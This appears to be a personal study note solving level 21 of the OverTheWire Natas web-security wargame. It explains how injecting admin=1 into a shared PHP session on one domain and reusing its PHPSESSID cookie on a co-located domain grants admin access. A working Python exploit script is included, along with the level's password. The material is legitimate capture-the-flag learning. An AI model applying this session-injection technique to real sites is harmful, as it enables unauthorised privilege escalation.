
2024-07-22 16:21

Source: #natas #web 

Tags: [[PHP]] 

## Natas21

- we have 2 domains 
- 1st domain 
	- only calls the print flag function and has text that mentions the other domain 
- 2nd domain 
	- if they submit to the page, every single key in the requests is actually stored in session. 
- by setting debug = true and submit = 1 in the `get` request we get to know that it's gonna read the `get` variables just as well as it would have read the `post` variable
- since the websites are collocated the session id is assumed to not change
we need the same session already occurring similar to [[PHPSESSID & session handler w py]] Natas20

```python
import requests
username = 'natas21'
password = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'

url = 'http://natas21.natas.labs.overthewire.org/?debug=true'

experiment = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'

session = requests.Session()

 # Getting the cookie from experiment domain we declare admin = 1 in `get` request in the url this can also be done via `post` method

response = session.get(experiment,auth=(username,password))
old_cookie = session.cookies["PHPSESSID"]

# using previously aquired session cookie in the main domain

responses = session.get(url,cookies= {"PHPSESSID" :old_cookie},auth=(username,password))
print(responses.text)
```
### TLDR

- We are forcing admin = 1 on experiment domain to get the session cookie of an admin account 
- since the session id is same for both the domains we copy the cookie from the experiment domain and use it in the main url to become admin and get the flag 

### References
https://www.youtube.com/watch?v=iFgQyI3Vfag